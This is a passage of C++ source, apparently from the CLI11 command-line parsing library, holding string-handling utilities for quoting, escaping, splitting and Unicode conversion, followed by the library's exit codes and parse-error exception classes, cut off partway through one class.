        CLI11_INLINE bool valid_name_string(const std::string& str);

        /// Verify an app name
        inline bool valid_alias_name_string(const std::string& str) {
            static const std::string badChars(std::string("\n") + '\0');
            return (str.find_first_of(badChars) == std::string::npos);
        }

        /// check if a string is a container segment separator (empty or "%%")
        inline bool is_separator(const std::string& str) {
            static const std::string sep("%%");
            return (str.empty() || str == sep);
        }

        /// Verify that str consists of letters only
        inline bool isalpha(const std::string& str) {
            return std::all_of(str.begin(), str.end(), [](char c) { return std::isalpha(c, std::locale()); });
        }

        /// Return a lower case version of a string
        inline std::string to_lower(std::string str) {
            std::transform(std::begin(str), std::end(str), std::begin(str), [](const std::string::value_type& x) {
                return std::tolower(x, std::locale());
                });
            return str;
        }

        /// remove underscores from a string
        inline std::string remove_underscore(std::string str) {
            str.erase(std::remove(std::begin(str), std::end(str), '_'), std::end(str));
            return str;
        }

        /// Find and replace a substring with another substring
        CLI11_INLINE std::string find_and_replace(std::string str, std::string from, std::string to);

        /// check if the flag definitions has possible false flags
        inline bool has_default_flag_values(const std::string& flags) {
            return (flags.find_first_of("{!") != std::string::npos);
        }

        CLI11_INLINE void remove_default_flag_values(std::string& flags);

        /// Check if a string is a member of a list of strings and optionally ignore case or ignore underscores
        CLI11_INLINE std::ptrdiff_t find_member(std::string name,
            const std::vector<std::string> names,
            bool ignore_case = false,
            bool ignore_underscore = false);

        /// Find a trigger string and call a modify callable function that takes the current string and starting position of the
        /// trigger and returns the position in the string to search for the next trigger string
        template <typename Callable> inline std::string find_and_modify(std::string str, std::string trigger, Callable modify) {
            std::size_t start_pos = 0;
            while ((start_pos = str.find(trigger, start_pos)) != std::string::npos) {
                start_pos = modify(str, start_pos);
            }
            return str;
        }

        /// close a sequence of characters indicated by a closure character.  Brackets allows sub sequences
        /// recognized bracket sequences include "'`[(<{  other closure characters are assumed to be literal strings
        CLI11_INLINE std::size_t close_sequence(const std::string& str, std::size_t start, char closure_char);

        /// Split a string '"one two" "three"' into 'one two', 'three'
        /// Quote characters can be ` ' or " or bracket characters [{(< with matching to the matching bracket
        CLI11_INLINE std::vector<std::string> split_up(std::string str, char delimiter = '\0');

        /// get the value of an environmental variable or empty string if empty
        CLI11_INLINE std::string get_environment_value(const std::string& env_name);

        /// This function detects an equal or colon followed by an escaped quote after an argument
        /// then modifies the string to replace the equality with a space.  This is needed
        /// to allow the split up function to work properly and is intended to be used with the find_and_modify function
        /// the return value is the offset+1 which is required by the find_and_modify function.
        CLI11_INLINE std::size_t escape_detect(std::string& str, std::size_t offset);

        /// @brief  detect if a string has escapable characters
        /// @param str the string to do the detection on
        /// @return true if the string has escapable characters
        CLI11_INLINE bool has_escapable_character(const std::string& str);

        /// @brief escape all escapable characters
        /// @param str the string to escape
        /// @return a string with the escapable characters escaped with '\'
        CLI11_INLINE std::string add_escaped_characters(const std::string& str);

        /// @brief replace the escaped characters with their equivalent
        CLI11_INLINE std::string remove_escaped_characters(const std::string& str);

        /// generate a string with all non printable characters escaped to hex codes
        CLI11_INLINE std::string binary_escape_string(const std::string& string_to_escape);

        CLI11_INLINE bool is_binary_escaped_string(const std::string& escaped_string);

        /// extract an escaped binary_string
        CLI11_INLINE std::string extract_binary_string(const std::string& escaped_string);

        /// process a quoted string, remove the quotes and if appropriate handle escaped characters
        CLI11_INLINE bool process_quoted_string(std::string& str, char string_char = '\"', char literal_char = '\'');

        /// This function formats the given text as a paragraph with fixed width and applies correct line wrapping
        /// with a custom line prefix. The paragraph will get streamed to the given ostream.
        CLI11_INLINE std::ostream& streamOutAsParagraph(std::ostream& out,
            const std::string& text,
            std::size_t paragraphWidth,
            const std::string& linePrefix = "",
            bool skipPrefixOnFirstLine = false);

    }  // namespace detail




    namespace detail {
        CLI11_INLINE std::vector<std::string> split(const std::string& s, char delim) {
            std::vector<std::string> elems;
            // Check to see if empty string, give consistent result
            if (s.empty()) {
                elems.emplace_back();
            }
            else {
                std::stringstream ss;
                ss.str(s);
                std::string item;
                while (std::getline(ss, item, delim)) {
                    elems.push_back(item);
                }
            }
            return elems;
        }

        CLI11_INLINE std::string& ltrim(std::string& str) {
            auto it = std::find_if(str.begin(), str.end(), [](char ch) { return !std::isspace<char>(ch, std::locale()); });
            str.erase(str.begin(), it);
            return str;
        }

        CLI11_INLINE std::string& ltrim(std::string& str, const std::string& filter) {
            auto it = std::find_if(str.begin(), str.end(), [&filter](char ch) { return filter.find(ch) == std::string::npos; });
            str.erase(str.begin(), it);
            return str;
        }

        CLI11_INLINE std::string& rtrim(std::string& str) {
            auto it = std::find_if(str.rbegin(), str.rend(), [](char ch) { return !std::isspace<char>(ch, std::locale()); });
            str.erase(it.base(), str.end());
            return str;
        }

        CLI11_INLINE std::string& rtrim(std::string& str, const std::string& filter) {
            auto it =
                std::find_if(str.rbegin(), str.rend(), [&filter](char ch) { return filter.find(ch) == std::string::npos; });
            str.erase(it.base(), str.end());
            return str;
        }

        CLI11_INLINE std::string& remove_quotes(std::string& str) {
            if (str.length() > 1 && (str.front() == '"' || str.front() == '\'' || str.front() == '`')) {
                if (str.front() == str.back()) {
                    str.pop_back();
                    str.erase(str.begin(), str.begin() + 1);
                }
            }
            return str;
        }

        CLI11_INLINE std::string& remove_outer(std::string& str, char key) {
            if (str.length() > 1 && (str.front() == key)) {
                if (str.front() == str.back()) {
                    str.pop_back();
                    str.erase(str.begin(), str.begin() + 1);
                }
            }
            return str;
        }

        CLI11_INLINE std::string fix_newlines(const std::string& leader, std::string input) {
            std::string::size_type n = 0;
            while (n != std::string::npos && n < input.size()) {
                n = input.find('\n', n);
                if (n != std::string::npos) {
                    input = input.substr(0, n + 1) + leader + input.substr(n + 1);
                    n += leader.size();
                }
            }
            return input;
        }

        CLI11_INLINE std::ostream& format_aliases(std::ostream& out, const std::vector<std::string>& aliases, std::size_t wid) {
            if (!aliases.empty()) {
                out << std::setw(static_cast<int>(wid)) << "     aliases: ";
                bool front = true;
                for (const auto& alias : aliases) {
                    if (!front) {
                        out << ", ";
                    }
                    else {
                        front = false;
                    }
                    out << detail::fix_newlines("              ", alias);
                }
                out << "\n";
            }
            return out;
        }

        CLI11_INLINE bool valid_name_string(const std::string& str) {
            if (str.empty() || !valid_first_char(str[0])) {
                return false;
            }
            auto e = str.end();
            for (auto c = str.begin() + 1; c != e; ++c)
                if (!valid_later_char(*c))
                    return false;
            return true;
        }

        CLI11_INLINE std::string find_and_replace(std::string str, std::string from, std::string to) {

            std::size_t start_pos = 0;

            while ((start_pos = str.find(from, start_pos)) != std::string::npos) {
                str.replace(start_pos, from.length(), to);
                start_pos += to.length();
            }

            return str;
        }

        CLI11_INLINE void remove_default_flag_values(std::string& flags) {
            auto loc = flags.find_first_of('{', 2);
            while (loc != std::string::npos) {
                auto finish = flags.find_first_of("},", loc + 1);
                if ((finish != std::string::npos) && (flags[finish] == '}')) {
                    flags.erase(flags.begin() + static_cast<std::ptrdiff_t>(loc),
                        flags.begin() + static_cast<std::ptrdiff_t>(finish) + 1);
                }
                loc = flags.find_first_of('{', loc + 1);
            }
            flags.erase(std::remove(flags.begin(), flags.end(), '!'), flags.end());
        }

        CLI11_INLINE std::ptrdiff_t
            find_member(std::string name, const std::vector<std::string> names, bool ignore_case, bool ignore_underscore) {
            auto it = std::end(names);
            if (ignore_case) {
                if (ignore_underscore) {
                    name = detail::to_lower(detail::remove_underscore(name));
                    it = std::find_if(std::begin(names), std::end(names), [&name](std::string local_name) {
                        return detail::to_lower(detail::remove_underscore(local_name)) == name;
                        });
                }
                else {
                    name = detail::to_lower(name);
                    it = std::find_if(std::begin(names), std::end(names), [&name](std::string local_name) {
                        return detail::to_lower(local_name) == name;
                        });
                }

            }
            else if (ignore_underscore) {
                name = detail::remove_underscore(name);
                it = std::find_if(std::begin(names), std::end(names), [&name](std::string local_name) {
                    return detail::remove_underscore(local_name) == name;
                    });
            }
            else {
                it = std::find(std::begin(names), std::end(names), name);
            }

            return (it != std::end(names)) ? (it - std::begin(names)) : (-1);
        }

        static const std::string escapedChars("\b\t\n\f\r\"\\");
        static const std::string escapedCharsCode("btnfr\"\\");
        static const std::string bracketChars{ "\"'`[(<{" };
        static const std::string matchBracketChars("\"'`])>}");

        CLI11_INLINE bool has_escapable_character(const std::string& str) {
            return (str.find_first_of(escapedChars) != std::string::npos);
        }

        CLI11_INLINE std::string add_escaped_characters(const std::string& str) {
            std::string out;
            out.reserve(str.size() + 4);
            for (char s : str) {
                auto sloc = escapedChars.find_first_of(s);
                if (sloc != std::string::npos) {
                    out.push_back('\\');
                    out.push_back(escapedCharsCode[sloc]);
                }
                else {
                    out.push_back(s);
                }
            }
            return out;
        }

        CLI11_INLINE std::uint32_t hexConvert(char hc) {
            int hcode{ 0 };
            if (hc >= '0' && hc <= '9') {
                hcode = (hc - '0');
            }
            else if (hc >= 'A' && hc <= 'F') {
                hcode = (hc - 'A' + 10);
            }
            else if (hc >= 'a' && hc <= 'f') {
                hcode = (hc - 'a' + 10);
            }
            else {
                hcode = -1;
            }
            return static_cast<uint32_t>(hcode);
        }

        CLI11_INLINE char make_char(std::uint32_t code) { return static_cast<char>(static_cast<unsigned char>(code)); }

        CLI11_INLINE void append_codepoint(std::string& str, std::uint32_t code) {
            if (code < 0x80) {  // ascii code equivalent
                str.push_back(static_cast<char>(code));
            }
            else if (code < 0x800) {  // \u0080 to \u07FF
                // 110yyyyx 10xxxxxx; 0x3f == 0b0011'1111
                str.push_back(make_char(0xC0 | code >> 6));
                str.push_back(make_char(0x80 | (code & 0x3F)));
            }
            else if (code < 0x10000) {  // U+0800...U+FFFF
                if (0xD800 <= code && code <= 0xDFFF) {
                    throw std::invalid_argument("[0xD800, 0xDFFF] are not valid UTF-8.");
                }
                // 1110yyyy 10yxxxxx 10xxxxxx
                str.push_back(make_char(0xE0 | code >> 12));
                str.push_back(make_char(0x80 | (code >> 6 & 0x3F)));
                str.push_back(make_char(0x80 | (code & 0x3F)));
            }
            else if (code < 0x110000) {  // U+010000 ... U+10FFFF
                // 11110yyy 10yyxxxx 10xxxxxx 10xxxxxx
                str.push_back(make_char(0xF0 | code >> 18));
                str.push_back(make_char(0x80 | (code >> 12 & 0x3F)));
                str.push_back(make_char(0x80 | (code >> 6 & 0x3F)));
                str.push_back(make_char(0x80 | (code & 0x3F)));
            }
        }

        CLI11_INLINE std::string remove_escaped_characters(const std::string& str) {

            std::string out;
            out.reserve(str.size());
            for (auto loc = str.begin(); loc < str.end(); ++loc) {
                if (*loc == '\\') {
                    if (str.end() - loc < 2) {
                        throw std::invalid_argument("invalid escape sequence " + str);
                    }
                    auto ecloc = escapedCharsCode.find_first_of(*(loc + 1));
                    if (ecloc != std::string::npos) {
                        out.push_back(escapedChars[ecloc]);
                        ++loc;
                    }
                    else if (*(loc + 1) == 'u') {
                        // must have 4 hex characters
                        if (str.end() - loc < 6) {
                            throw std::invalid_argument("unicode sequence must have 4 hex codes " + str);
                        }
                        std::uint32_t code{ 0 };
                        std::uint32_t mplier{ 16 * 16 * 16 };
                        for (int ii = 2; ii < 6; ++ii) {
                            std::uint32_t res = hexConvert(*(loc + ii));
                            if (res > 0x0F) {
                                throw std::invalid_argument("unicode sequence must have 4 hex codes " + str);
                            }
                            code += res * mplier;
                            mplier = mplier / 16;
                        }
                        append_codepoint(out, code);
                        loc += 5;
                    }
                    else if (*(loc + 1) == 'U') {
                        // must have 8 hex characters
                        if (str.end() - loc < 10) {
                            throw std::invalid_argument("unicode sequence must have 8 hex codes " + str);
                        }
                        std::uint32_t code{ 0 };
                        std::uint32_t mplier{ 16 * 16 * 16 * 16 * 16 * 16 * 16 };
                        for (int ii = 2; ii < 10; ++ii) {
                            std::uint32_t res = hexConvert(*(loc + ii));
                            if (res > 0x0F) {
                                throw std::invalid_argument("unicode sequence must have 8 hex codes " + str);
                            }
                            code += res * mplier;
                            mplier = mplier / 16;
                        }
                        append_codepoint(out, code);
                        loc += 9;
                    }
                    else if (*(loc + 1) == '0') {
                        out.push_back('\0');
                        ++loc;
                    }
                    else {
                        throw std::invalid_argument(std::string("unrecognized escape sequence \\") + *(loc + 1) + " in " + str);
                    }
                }
                else {
                    out.push_back(*loc);
                }
            }
            return out;
        }

        CLI11_INLINE std::size_t close_string_quote(const std::string& str, std::size_t start, char closure_char) {
            std::size_t loc{ 0 };
            for (loc = start + 1; loc < str.size(); ++loc) {
                if (str[loc] == closure_char) {
                    break;
                }
                if (str[loc] == '\\') {
                    // skip the next character for escaped sequences
                    ++loc;
                }
            }
            return loc;
        }

        CLI11_INLINE std::size_t close_literal_quote(const std::string& str, std::size_t start, char closure_char) {
            auto loc = str.find_first_of(closure_char, start + 1);
            return (loc != std::string::npos ? loc : str.size());
        }

        CLI11_INLINE std::size_t close_sequence(const std::string& str, std::size_t start, char closure_char) {

            auto bracket_loc = matchBracketChars.find(closure_char);
            switch (bracket_loc) {
            case 0:
                return close_string_quote(str, start, closure_char);
            case 1:
            case 2:
            case std::string::npos:
                return close_literal_quote(str, start, closure_char);
            default:
                break;
            }

            std::string closures(1, closure_char);
            auto loc = start + 1;

            while (loc < str.size()) {
                if (str[loc] == closures.back()) {
                    closures.pop_back();
                    if (closures.empty()) {
                        return loc;
                    }
                }
                bracket_loc = bracketChars.find(str[loc]);
                if (bracket_loc != std::string::npos) {
                    switch (bracket_loc) {
                    case 0:
                        loc = close_string_quote(str, loc, str[loc]);
                        break;
                    case 1:
                    case 2:
                        loc = close_literal_quote(str, loc, str[loc]);
                        break;
                    default:
                        closures.push_back(matchBracketChars[bracket_loc]);
                        break;
                    }
                }
                ++loc;
            }
            if (loc > str.size()) {
                loc = str.size();
            }
            return loc;
        }

        CLI11_INLINE std::vector<std::string> split_up(std::string str, char delimiter) {

            auto find_ws = [delimiter](char ch) {
                return (delimiter == '\0') ? std::isspace<char>(ch, std::locale()) : (ch == delimiter);
                };
            trim(str);

            std::vector<std::string> output;
            while (!str.empty()) {
                if (bracketChars.find_first_of(str[0]) != std::string::npos) {
                    auto bracketLoc = bracketChars.find_first_of(str[0]);
                    auto end = close_sequence(str, 0, matchBracketChars[bracketLoc]);
                    if (end >= str.size()) {
                        output.push_back(std::move(str));
                        str.clear();
                    }
                    else {
                        output.push_back(str.substr(0, end + 1));
                        if (end + 2 < str.size()) {
                            str = str.substr(end + 2);
                        }
                        else {
                            str.clear();
                        }
                    }

                }
                else {
                    auto it = std::find_if(std::begin(str), std::end(str), find_ws);
                    if (it != std::end(str)) {
                        std::string value = std::string(str.begin(), it);
                        output.push_back(value);
                        str = std::string(it + 1, str.end());
                    }
                    else {
                        output.push_back(str);
                        str.clear();
                    }
                }
                trim(str);
            }
            return output;
        }

        CLI11_INLINE std::size_t escape_detect(std::string& str, std::size_t offset) {
            auto next = str[offset + 1];
            if ((next == '\"') || (next == '\'') || (next == '`')) {
                auto astart = str.find_last_of("-/ \"\'`", offset - 1);
                if (astart != std::string::npos) {
                    if (str[astart] == ((str[offset] == '=') ? '-' : '/'))
                        str[offset] = ' ';  // interpret this as a space so the split_up works properly
                }
            }
            return offset + 1;
        }

        CLI11_INLINE std::string binary_escape_string(const std::string& string_to_escape) {
            // s is our escaped output string
            std::string escaped_string{};
            // loop through all characters
            for (char c : string_to_escape) {
                // check if a given character is printable
                // the cast is necessary to avoid undefined behaviour
                if (isprint(static_cast<unsigned char>(c)) == 0) {
                    std::stringstream stream;
                    // if the character is not printable
                    // we'll convert it to a hex string using a stringstream
                    // note that since char is signed we have to cast it to unsigned first
                    stream << std::hex << static_cast<unsigned int>(static_cast<unsigned char>(c));
                    std::string code = stream.str();
                    escaped_string += std::string("\\x") + (code.size() < 2 ? "0" : "") + code;
                }
                else if (c == 'x' || c == 'X') {
                    // need to check for inadvertent binary sequences
                    if (!escaped_string.empty() && escaped_string.back() == '\\') {
                        escaped_string += std::string("\\x") + (c == 'x' ? "78" : "58");
                    }
                    else {
                        escaped_string.push_back(c);
                    }

                }
                else {
                    escaped_string.push_back(c);
                }
            }
            if (escaped_string != string_to_escape) {
                auto sqLoc = escaped_string.find('\'');
                while (sqLoc != std::string::npos) {
                    escaped_string[sqLoc] = '\\';
                    escaped_string.insert(sqLoc + 1, "x27");
                    sqLoc = escaped_string.find('\'');
                }
                escaped_string.insert(0, "'B\"(");
                escaped_string.push_back(')');
                escaped_string.push_back('"');
                escaped_string.push_back('\'');
            }
            return escaped_string;
        }

        CLI11_INLINE bool is_binary_escaped_string(const std::string& escaped_string) {
            size_t ssize = escaped_string.size();
            if (escaped_string.compare(0, 3, "B\"(") == 0 && escaped_string.compare(ssize - 2, 2, ")\"") == 0) {
                return true;
            }
            return (escaped_string.compare(0, 4, "'B\"(") == 0 && escaped_string.compare(ssize - 3, 3, ")\"'") == 0);
        }

        CLI11_INLINE std::string extract_binary_string(const std::string& escaped_string) {
            std::size_t start{ 0 };
            std::size_t tail{ 0 };
            size_t ssize = escaped_string.size();
            if (escaped_string.compare(0, 3, "B\"(") == 0 && escaped_string.compare(ssize - 2, 2, ")\"") == 0) {
                start = 3;
                tail = 2;
            }
            else if (escaped_string.compare(0, 4, "'B\"(") == 0 && escaped_string.compare(ssize - 3, 3, ")\"'") == 0) {
                start = 4;
                tail = 3;
            }

            if (start == 0) {
                return escaped_string;
            }
            std::string outstring;

            outstring.reserve(ssize - start - tail);
            std::size_t loc = start;
            while (loc < ssize - tail) {
                // ssize-2 to skip )" at the end
                if (escaped_string[loc] == '\\' && (escaped_string[loc + 1] == 'x' || escaped_string[loc + 1] == 'X')) {
                    auto c1 = escaped_string[loc + 2];
                    auto c2 = escaped_string[loc + 3];

                    std::uint32_t res1 = hexConvert(c1);
                    std::uint32_t res2 = hexConvert(c2);
                    if (res1 <= 0x0F && res2 <= 0x0F) {
                        loc += 4;
                        outstring.push_back(static_cast<char>(res1 * 16 + res2));
                        continue;
                    }
                }
                outstring.push_back(escaped_string[loc]);
                ++loc;
            }
            return outstring;
        }

        CLI11_INLINE void remove_quotes(std::vector<std::string>& args) {
            for (auto& arg : args) {
                if (arg.front() == '\"' && arg.back() == '\"') {
                    remove_quotes(arg);
                    // only remove escaped for string arguments not literal strings
                    arg = remove_escaped_characters(arg);
                }
                else {
                    remove_quotes(arg);
                }
            }
        }

        CLI11_INLINE void handle_secondary_array(std::string& str) {
            if (str.size() >= 2 && str.front() == '[' && str.back() == ']') {
                // handle some special array processing for arguments if it might be interpreted as a secondary array
                std::string tstr{ "[[" };
                for (std::size_t ii = 1; ii < str.size(); ++ii) {
                    tstr.push_back(str[ii]);
                    tstr.push_back(str[ii]);
                }
                str = std::move(tstr);
            }
        }

        CLI11_INLINE bool process_quoted_string(std::string& str, char string_char, char literal_char) {
            if (str.size() <= 1) {
                return false;
            }
            if (detail::is_binary_escaped_string(str)) {
                str = detail::extract_binary_string(str);
                handle_secondary_array(str);
                return true;
            }
            if (str.front() == string_char && str.back() == string_char) {
                detail::remove_outer(str, string_char);
                if (str.find_first_of('\\') != std::string::npos) {
                    str = detail::remove_escaped_characters(str);
                }
                handle_secondary_array(str);
                return true;
            }
            if ((str.front() == literal_char || str.front() == '`') && str.back() == str.front()) {
                detail::remove_outer(str, str.front());
                handle_secondary_array(str);
                return true;
            }
            return false;
        }

        std::string get_environment_value(const std::string& env_name) {
            char* buffer = nullptr;
            std::string ename_string;

#ifdef _MSC_VER
            // Windows version
            std::size_t sz = 0;
            if (_dupenv_s(&buffer, &sz, env_name.c_str()) == 0 && buffer != nullptr) {
                ename_string = std::string(buffer);
                free(buffer);
            }
#else
            // This also works on Windows, but gives a warning
            buffer = std::getenv(env_name.c_str());
            if (buffer != nullptr) {
                ename_string = std::string(buffer);
            }
#endif
            return ename_string;
        }

        CLI11_INLINE std::ostream& streamOutAsParagraph(std::ostream& out,
            const std::string& text,
            std::size_t paragraphWidth,
            const std::string& linePrefix,
            bool skipPrefixOnFirstLine) {
            if (!skipPrefixOnFirstLine)
                out << linePrefix;  // First line prefix

            std::istringstream lss(text);
            std::string line = "";
            while (std::getline(lss, line)) {
                std::istringstream iss(line);
                std::string word = "";
                std::size_t charsWritten = 0;

                while (iss >> word) {
                    if (word.length() + charsWritten > paragraphWidth) {
                        out << '\n' << linePrefix;
                        charsWritten = 0;
                    }

                    out << word << " ";
                    charsWritten += word.length() + 1;
                }

                if (!lss.eof())
                    out << '\n' << linePrefix;
            }
            return out;
        }

    }  // namespace detail



    // Use one of these on all error classes.
    // These are temporary and are undef'd at the end of this file.
#define CLI11_ERROR_DEF(parent, name)                                                                                  \
  protected:                                                                                                           \
    name(std::string ename, std::string msg, int exit_code) : parent(std::move(ename), std::move(msg), exit_code) {}   \
    name(std::string ename, std::string msg, ExitCodes exit_code)                                                      \
        : parent(std::move(ename), std::move(msg), exit_code) {}                                                       \
                                                                                                                       \
  public:                                                                                                              \
    name(std::string msg, ExitCodes exit_code) : parent(#name, std::move(msg), exit_code) {}                           \
    name(std::string msg, int exit_code) : parent(#name, std::move(msg), exit_code) {}

// This is added after the one above if a class is used directly and builds its own message
#define CLI11_ERROR_SIMPLE(name)                                                                                       \
    explicit name(std::string msg) : name(#name, msg, ExitCodes::name) {}

/// These codes are part of every error in CLI. They can be obtained from e using e.exit_code or as a quick shortcut,
/// int values from e.get_error_code().
    enum class ExitCodes {
        Success = 0,
        IncorrectConstruction = 100,
        BadNameString,
        OptionAlreadyAdded,
        FileError,
        ConversionError,
        ValidationError,
        RequiredError,
        RequiresError,
        ExcludesError,
        ExtrasError,
        ConfigError,
        InvalidError,
        HorribleError,
        OptionNotFound,
        ArgumentMismatch,
        BaseClass = 127
    };

    // Error definitions

    /// @defgroup error_group Errors
    /// @brief Errors thrown by CLI11
    ///
    /// These are the errors that can be thrown. Some of them, like CLI::Success, are not really errors.
    /// @{

    /// All errors derive from this one
    class Error : public std::runtime_error {
        int actual_exit_code;
        std::string error_name{ "Error" };

    public:
        CLI11_NODISCARD int get_exit_code() const { return actual_exit_code; }

        CLI11_NODISCARD std::string get_name() const { return error_name; }

        Error(std::string name, std::string msg, int exit_code = static_cast<int>(ExitCodes::BaseClass))
            : runtime_error(msg), actual_exit_code(exit_code), error_name(std::move(name)) {}

        Error(std::string name, std::string msg, ExitCodes exit_code) : Error(name, msg, static_cast<int>(exit_code)) {}
    };

    // Note: Using Error::Error constructors does not work on GCC 4.7

    /// Construction errors (not in parsing)
    class ConstructionError : public Error {
        CLI11_ERROR_DEF(Error, ConstructionError)
    };

    /// Thrown when an option is set to conflicting values (non-vector and multi args, for example)
    class IncorrectConstruction : public ConstructionError {
        CLI11_ERROR_DEF(ConstructionError, IncorrectConstruction)
            CLI11_ERROR_SIMPLE(IncorrectConstruction)
            static IncorrectConstruction PositionalFlag(std::string name) {
            return IncorrectConstruction(name + ": Flags cannot be positional");
        }
        static IncorrectConstruction Set0Opt(std::string name) {
            return IncorrectConstruction(name + ": Cannot set 0 expected, use a flag instead");
        }
        static IncorrectConstruction SetFlag(std::string name) {
            return IncorrectConstruction(name + ": Cannot set an expected number for flags");
        }
        static IncorrectConstruction ChangeNotVector(std::string name) {
            return IncorrectConstruction(name + ": You can only change the expected arguments for vectors");
        }
        static IncorrectConstruction AfterMultiOpt(std::string name) {
            return IncorrectConstruction(
                name + ": You can't change expected arguments after you've changed the multi option policy!");
        }
        static IncorrectConstruction MissingOption(std::string name) {
            return IncorrectConstruction("Option " + name + " is not defined");
        }
        static IncorrectConstruction MultiOptionPolicy(std::string name) {
            return IncorrectConstruction(name + ": multi_option_policy only works for flags and exact value options");
        }
    };

    /// Thrown on construction of a bad name
    class BadNameString : public ConstructionError {
        CLI11_ERROR_DEF(ConstructionError, BadNameString)
            CLI11_ERROR_SIMPLE(BadNameString)
            static BadNameString OneCharName(std::string name) { return BadNameString("Invalid one char name: " + name); }
        static BadNameString MissingDash(std::string name) {
            return BadNameString("Long names strings require 2 dashes " + name);
        }
        static BadNameString BadLongName(std::string name) { return BadNameString("Bad long name: " + name); }
        static BadNameString BadPositionalName(std::string name) {
            return BadNameString("Invalid positional Name: " + name);
        }
        static BadNameString ReservedName(std::string name) {
            return BadNameString("Names '-','--','++' are reserved and not allowed as option names " + name);
        }
        static BadNameString MultiPositionalNames(std::string name) {
            return BadNameString("Only one positional name allowed, remove: " + name);
        }
    };

    /// Thrown when an option already exists
    class OptionAlreadyAdded : public ConstructionError {
        CLI11_ERROR_DEF(ConstructionError, OptionAlreadyAdded)
            explicit OptionAlreadyAdded(std::string name)
            : OptionAlreadyAdded(name + " is already added", ExitCodes::OptionAlreadyAdded) {}
        static OptionAlreadyAdded Requires(std::string name, std::string other) {
            return { name + " requires " + other, ExitCodes::OptionAlreadyAdded };
        }
        static OptionAlreadyAdded Excludes(std::string name, std::string other) {
            return { name + " excludes " + other, ExitCodes::OptionAlreadyAdded };
        }
    };

    // Parsing errors

    /// Anything that can error in Parse
    class ParseError : public Error {
        CLI11_ERROR_DEF(Error, ParseError)
    };

    // Not really "errors"

    /// This is a successful completion on parsing, supposed to exit
    class Success : public ParseError {
        CLI11_ERROR_DEF(ParseError, Success)
            Success() : Success("Successfully completed, should be caught and quit", ExitCodes::Success) {}
    };

    /// -h or --help on command line
    class CallForHelp : public Success {
        CLI11_ERROR_DEF(Success, CallForHelp)
            CallForHelp() : CallForHelp("This should be caught in your main function, see examples", ExitCodes::Success) {}
    };

    /// Usually something like --help-all on command line
    class CallForAllHelp : public Success {
        CLI11_ERROR_DEF(Success, CallForAllHelp)
            CallForAllHelp()
            : CallForAllHelp("This should be caught in your main function, see examples", ExitCodes::Success) {}
    };

    /// -v or --version on command line
    class CallForVersion : public Success {
        CLI11_ERROR_DEF(Success, CallForVersion)
            CallForVersion()
            : CallForVersion("This should be caught in your main function, see examples", ExitCodes::Success) {}
    };

    /// Does not output a diagnostic in CLI11_PARSE, but allows main() to return with a specific error code.
    class RuntimeError : public ParseError {
        CLI11_ERROR_DEF(ParseError, RuntimeError)
            explicit RuntimeError(int exit_code = 1) : RuntimeError("Runtime error", exit_code) {}
    };

    /// Thrown when parsing an INI file and it is missing
    class FileError : public ParseError {
        CLI11_ERROR_DEF(ParseError, FileError)
            CLI11_ERROR_SIMPLE(FileError)
            static FileError Missing(std::string name) { return FileError(name + " was not readable (missing?)"); }
    };

    /// Thrown when conversion call back fails, such as when an int fails to coerce to a string
    class ConversionError : public ParseError {
        CLI11_ERROR_DEF(ParseError, ConversionError)
            CLI11_ERROR_SIMPLE(ConversionError)
            ConversionError(std::string member, std::string name)
            : ConversionError("The value " + member + " is not an allowed value for " + name) {}
        ConversionError(std::string name, std::vector<std::string> results)
            : ConversionError("Could not convert: " + name + " = " + detail::join(results)) {}
        static ConversionError TooManyInputsFlag(std::string name) {
            return ConversionError(name + ": too many inputs for a flag");
        }
        static ConversionError TrueFalse(std::string name) {
            return ConversionError(name + ": Should be true/false or a number");
        }
    };

    /// Thrown when validation of results fails
    class ValidationError : public ParseError {
        CLI11_ERROR_DEF(ParseError, ValidationError)
            CLI11_ERROR_SIMPLE(ValidationError)
            explicit ValidationError(std::string name, std::string msg) : ValidationError(name + ": " + msg) {}
    };

    /// Thrown when a required option is missing
    class RequiredError : public ParseError {
        CLI11_ERROR_DEF(ParseError, RequiredError)
            explicit RequiredError(std::string name) : RequiredError(name + " is required", ExitCodes::RequiredError) {}
        static RequiredError Subcommand(std::size_t min_subcom) {
            if (min_subcom == 1) {
                return RequiredError("A subcommand");
            }
            return { "Requires at least " + std::to_string(min_subcom) + " subcommands", ExitCodes::RequiredError };
        }
        static RequiredError
            Option(std::size_t min_option, std::size_t max_option, std::size_t used, const std::string& option_list) {
            if ((min_option == 1) && (max_option == 1) && (used == 0))
                return RequiredError("Exactly 1 option from [" + option_list + "]");
            if ((min_option == 1) && (max_option == 1) && (used > 1)) {
                return { "Exactly 1 option from [" + option_list + "] is required but " + std::to_string(used) +
                            " were given",
                        ExitCodes::RequiredError };
            }
            if ((min_option == 1) && (used == 0))
                return RequiredError("At least 1 option from [" + option_list + "]");
            if (used < min_option) {
                return { "Requires at least " + std::to_string(min_option) + " options used but only " +
                            std::to_string(used) + " were given from [" + option_list + "]",
                        ExitCodes::RequiredError };
            }
            if (max_option == 1)
                return { "Requires at most 1 options be given from [" + option_list + "]", ExitCodes::RequiredError };

            return { "Requires at most " + std::to_string(max_option) + " options be used but " + std::to_string(used) +
                        " were given from [" + option_list + "]",
                    ExitCodes::RequiredError };
        }
    };

    /// Thrown when the wrong number of arguments has been received
    class ArgumentMismatch : public ParseError {
        CLI11_ERROR_DEF(ParseError, ArgumentMismatch)
            CLI11_ERROR_SIMPLE(ArgumentMismatch)
            ArgumentMismatch(std::string name, int expected, std::size_t received)
            : ArgumentMismatch(expected > 0 ? ("Expected exactly " + std::to_string(expected) + " arguments to " + name +
                ", got " + std::to_string(received))
                : ("Expected at least " + std::to_string(-expected) + " arguments to " + name +
                    ", got " + std::to_string(received)),
                ExitCodes::ArgumentMismatch) {}

        static ArgumentMismatch AtLeast(std::string name, int num, std::size_t received) {
            return ArgumentMismatch(name + ": At least " + std::to_string(num) + " required but received " +
                std::to_string(received));
        }
        static ArgumentMismatch AtMost(std::string name, int num, std::size_t received) {
            return ArgumentMismatch(name + ": At Most " + std::to_string(num) + " required but received " +
                std::to_string(received));
        }
        static ArgumentMismatch TypedAtLeast(std::string name, int num, std::string type) {
            return ArgumentMismatch(name + ": " + std::to_string(num) + " required " + type + " missing");
        }
        static ArgumentMismatch FlagOverride(std::string name) {
            return ArgumentMismatch(name + " was given a disallowed flag override");
        }
        static ArgumentMismatch PartialType(std::string name, int num, std::string type) {
            return ArgumentMismatch(name + ": " + type + " only partially specified: " + std::to_string(num) +
                " required for each element");
        }
    };

    /// Thrown when a requires option is missing
    class RequiresError : public ParseError {
        CLI11_ERROR_DEF(ParseError, RequiresError)
